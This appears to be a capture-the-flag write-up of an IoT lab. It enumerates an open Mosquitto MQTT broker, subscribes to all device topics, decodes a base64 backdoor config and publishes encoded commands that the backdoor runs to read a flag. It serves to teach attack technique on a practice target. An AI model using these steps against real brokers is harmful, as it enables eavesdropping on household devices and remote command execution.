``Host:`` bugged.thm

### Host (IoT) Enumeration
```r
sudo nmap -p- bugged.thm -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 22:21 EDT
Nmap scan report for bugged.thm (10.10.211.128)
Host is up (0.15s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
1883/tcp open  mqtt

Nmap done: 1 IP address (1 host up) scanned in 722.96 seconds
```
With the host enumeration with NMAP completed, We can see that it only has one port and one service running ``mqtt`` on port 1833.
_MQ Telemetry Transport (MQTT) is known as a publish/subscribe messaging protocol that stands out for its extreme simplicity and lightness. This protocol is specifically tailored for environments where devices have limited capabilities and operate over networks that are characterized by low bandwidth, high latency, or unreliable connections. These goals make MQTT exceptionally suitable for the burgeoning field of machine-to-machine (M2M) communication and the Internet of Things (IoT), where it's essential to connect a myriad of devices efficiently. Moreover, MQTT is highly beneficial for mobile applications, where conserving bandwidth and battery life is crucial._

Let's do a little bit more of a vuln scan to view more information on that host machine.
```r
sudo nmap -A -sC -p 1883 bugged.thm
[sudo] password for dcyberguy: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 22:45 EDT
Nmap scan report for bugged.thm (10.10.211.128)
Host is up (0.11s latency).

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/sent/15min: 79.85
|     livingroom/speaker: {"id":2503532439686446461,"gain":41}
|     $SYS/broker/load/messages/received/15min: 79.85
|     $SYS/broker/messages/received: 2957
|     $SYS/broker/load/messages/sent/5min: 89.50
|     $SYS/broker/load/bytes/sent/1min: 350.35
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/bytes/sent/5min: 358.01
|     $SYS/broker/bytes/sent: 11829
|     $SYS/broker/version: mosquitto version 2.0.14
|     yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
|     $SYS/broker/messages/sent: 2957
|     $SYS/broker/load/messages/received/1min: 87.59
|     $SYS/broker/load/connections/1min: 0.91
|     $SYS/broker/load/bytes/sent/15min: 319.42
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/load/sockets/15min: 0.11
|     $SYS/broker/load/bytes/received/1min: 3967.79
|     $SYS/broker/load/bytes/received/5min: 4216.80
|     $SYS/broker/uptime: 1969 seconds
|     $SYS/broker/load/bytes/received/15min: 3779.81
|     $SYS/broker/load/sockets/5min: 0.24
|     $SYS/broker/store/messages/count: 52
|     $SYS/broker/bytes/received: 140053
|     $SYS/broker/store/messages/bytes: 308
|     $SYS/broker/load/messages/received/5min: 89.50
|     $SYS/broker/messages/stored: 52
|     $SYS/broker/load/messages/sent/1min: 87.59
|     $SYS/broker/publish/bytes/received: 99966
|     storage/thermostat: {"id":4225093720074778126,"temperature":24.370138}
|     patio/lights: {"id":13113594345698905428,"color":"GREEN","status":"ON"}
|_    $SYS/broker/load/connections/15min: 0.07
```

We now see a whole lot more information and message we are subscribed to.

Let's install ``mosquitto mositto-clients`` or you can use below python code 
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
	client.subscribe('#', qos=1)
	client.subscribe('$SYS/#')

def on_message(client, userdata, message):
	print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
	client = mqtt.Client()
	client.on_connect = on_connect
	client.on_message = on_message
	client.connect(HOST, PORT)
	client.loop_start()
	#time.sleep(10)
	#client.loop_stop()

if __name__ == "__main__":
	main()

```

After installation, we run the mosquito client and subscribe to all topics
```r
mosquitto_sub -h 10.10.211.128 -t "#" -v
storage/thermostat {"id":4424087202401419041,"temperature":24.315678}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
patio/lights {"id":6367359151460270272,"color":"BLUE","status":"OFF"}
kitchen/toaster {"id":3673559716775066364,"in_use":false,"temperature":159.94699,"toast_time":200}
frontdeck/camera {"id":3469777500978391270,"yaxis":-131.96877,"xaxis":78.39072,"zoom":3.052149,"movement":false}
livingroom/speaker {"id":6346922298882139147,"gain":43}
storage/thermostat {"id":10779462243664664036,"temperature":24.486012}
patio/lights {"id":13439815576938688600,"color":"GREEN","status":"OFF"}
storage/thermostat {"id":12352118950085859924,"temperature":24.03314}
livingroom/speaker {"id":7436510398294813606,"gain":69}
kitchen/toaster {"id":6365751887703423581,"in_use":true,"temperature":157.1976,"toast_time":217}
storage/thermostat {"id":6732570971239673425,"temperature":23.903341}
patio/lights {"id":15075058155825401339,"color":"WHITE","status":"ON"}
frontdeck/camera {"id":9765936963053306852,"yaxis":44.41536,"xaxis":-80.401596,"zoom":2.1879764,"movement":false}
livingroom/speaker {"id":15841450779018084555,"gain":69}
storage/thermostat {"id":6855645772535819253,"temperature":24.210281}
kitchen/toaster {"id":447861946156371125,"in_use":true,"temperature":144.22583,"toast_time":316}
livingroom/speaker {"id":15823401485756106547,"gain":69}
patio/lights {"id":3576228414416817688,"color":"GREEN","status":"OFF"}
storage/thermostat {"id":6113459330587820991,"temperature":23.947418}
kitchen/toaster {"id":4222486249924966950,"in_use":false,"temperature":147.68697,"toast_time":357}
frontdeck/camera {"id":13395068193157550498,"yaxis":-76.047325,"xaxis":-130.62901,"zoom":3.8669345,"movement":false}
livingroom/speaker {"id":8517336037859347879,"gain":57}
patio/lights {"id":17871408563665273509,"color":"RED","status":"OFF"}
storage/thermostat {"id":13677569039790021558,"temperature":23.196152}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
<< snip >>
```
After a while we start getting some weird string of texts, they are actually ``base 64 encoded`` strings. 
Let's use decode it from the command line, why not? lol
```r
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ== | base64 --decode       
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}%    
```
What do we have here? We see some commands like ``HELP``, ``CMD``, and ``SYS`` and also two topics, ``pub_topic`` and ``sub_topic``.


## Exploiting MQTT

Lets send a message to the two specific topics we just found above.
Start running ``mosquitto_sub -h 10.10.211.128 -t "#" -v`` on one tab and run ``mosquitto_pub -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub -h 10.10.211.128 -m "hello"`` on the second and watch as the message ``whoami`` is published in the first tab. Not what we wanted. Why? Because if we take the encoded base64 string and decode it, it gives us the same data in plain text.
```r
patio/lights {"id":11889107811064360849,"color":"PURPLE","status":"ON"}
storage/thermostat {"id":5758065865929160412,"temperature":23.008257}
frontdeck/camera {"id":12734952258844187532,"yaxis":-115.4385,"xaxis":-51.510086,"zoom":2.436681,"movement":false}
livingroom/speaker {"id":1209212667415271368,"gain":50}
kitchen/toaster {"id":16288030482377517315,"in_use":false,"temperature":146.48544,"toast_time":339}
patio/lights {"id":2929369648636588611,"color":"RED","status":"ON"}
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub whoami
storage/thermostat {"id":9531581635509475268,"temperature":23.119894}
livingroom/speaker {"id":17994486064006229578,"gain":44}
kitchen/toaster {"id":13741228036460028322,"in_use":true,"temperature":157.28143,"toast_time":151}

```

Let's use the second topic:
```r
mosquitto_pub -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -h 10.10.211.128 -m "hello"
```
and also run ``mosquitto_sub -h 10.10.211.128 -t "#" -v`` on another tab, let's view the message
```r
mosquitto_sub -h 10.10.211.128 -t "#" -v
patio/lights {"id":4304873169885424399,"color":"PURPLE","status":"OFF"}
storage/thermostat {"id":17919406295669626160,"temperature":23.066387}
frontdeck/camera {"id":6069931459514898160,"yaxis":-127.345146,"xaxis":-108.20679,"zoom":2.2623923,"movement":true}
livingroom/speaker {"id":3344206306783571610,"gain":48}
kitchen/toaster {"id":6254890677959890702,"in_use":true,"temperature":149.53917,"toast_time":304}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub hello
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=
storage/thermostat {"id":10037350582510015336,"temperature":23.817501}
livingroom/speaker {"id":17774124095598642456,"gain":46}
patio/lights {"id":17019901905888515669,"color":"RED","status":"OFF"}
kitchen/toaster {"id":4827872121869012879,"in_use":true,"temperature":151.87283,"toast_time":291}
storage/thermostat {"id":5813655514586686632,"temperature":23.610136}
yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
```

After run that we get a new base64 encode text. Let's decode it as usual
```r
bugged echo SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk= | base64 --decode
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})%                                                 ➜  bugged 
```

We get a whole different format that comprises of id, cmd and an arg.
Based on the second sub_topic, we will fill out the format and use the ``whoami`` command for the ``arg``.
something like this: ``{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}``

Let us save to a file called ``base64encoded.txt`` encode it to base64.
```r
nano base64encoded.txt 
base64 base64encoded.txt
eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNN
RCIsICJhcmciOiAibHMifQo=
```

So let's both both on two separate terminals and capture the output
first terminal
```r
mosquitto_pub -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -h 10.10.211.128 -m "eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo="
```

Second terminal:
```r
mosquitto_sub -h 10.10.211.128 -t "#" -v
storage/thermostat {"id":2336703387415567708,"temperature":23.934895}
patio/lights {"id":12114664026872428624,"color":"RED","status":"OFF"}
frontdeck/camera {"id":805224080488088493,"yaxis":114.80798,"xaxis":95.28137,"zoom":3.1519709,"movement":false}
livingroom/speaker {"id":5948856983848466350,"gain":65}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAibHMifQo=
storage/thermostat {"id":5512785026372212484,"temperature":24.083206}
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9

```
We get the output as: ``eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9``. Lets decode ir.

```r
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9 | base64 --decode
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}% 
```
Nice! we see a ``flag.txt``. 

Let's do the process again, but this time we will use the ``flag.txt`` in our arguments
``{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}``

I will encode it in base64 and run the same pattern as we did before.

```r
mosquitto_sub -h 10.10.211.128 -t "#" -v
livingroom/speaker {"id":11198482597063915374,"gain":47}
storage/thermostat {"id":3001615010740800409,"temperature":23.800558}
kitchen/toaster {"id":6696800457979353322,"in_use":true,"temperature":144.47551,"toast_time":181}
patio/lights {"id":15958837671297077404,"color":"RED","status":"ON"}
XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAiY2F0IGZsYWcudHh0In0K
U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9

```

Decode the output from Base64.
```r
echo eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9 | base64 --decode
{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}\n"}%
```
Got flag!!